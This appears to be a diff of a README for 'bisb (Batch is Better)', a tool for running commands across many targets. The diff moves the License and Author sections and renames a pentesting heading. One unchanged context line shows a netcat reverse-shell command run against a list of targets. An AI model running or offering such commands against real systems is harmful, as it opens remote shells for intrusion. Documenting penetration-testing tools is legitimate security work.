@@ -60,11 +60,17 @@ Here are some examples of how to use **bisb**:
 Contributions to **bisb** are welcome! Please feel free to [open an issue](https://github.com/GTekSD/Batch-is-Better/issues) or [submit a pull request](https://github.com/GTekSD/Batch-is-Better/pulls) for enhancements or bug fixes.
 
 
+## License
 
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## Author
+
+Developed with ❤️ by [Сухас Дхолз](https://gteksd.github.io/) for [GTekSD](https://github.com/GTekSD/).
 
 -----------------
 
-# In Pentesting
+# In Penetration Testing
 
 To demonstrate how **bisb (Batch is Better)** can be highly useful in a pentesting scenario, here are 10 critical examples that simplify complex tasks:
 
@@ -133,12 +139,3 @@ $ bisb "nc -e /bin/sh 192.168.1.200 4444" target_list.txt
 
 ### Summary
 These examples show how **bisb (Batch is Better)** can automate repetitive and critical tasks during a pentest, making the process more efficient and less error-prone. It saves time, increases productivity, and ensures comprehensive coverage across multiple targets.
-
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Author
-
-Developed with ❤️ by [Сухас Дхолз](https://gteksd.github.io/) for [GTekSD](https://github.com/GTekSD/).
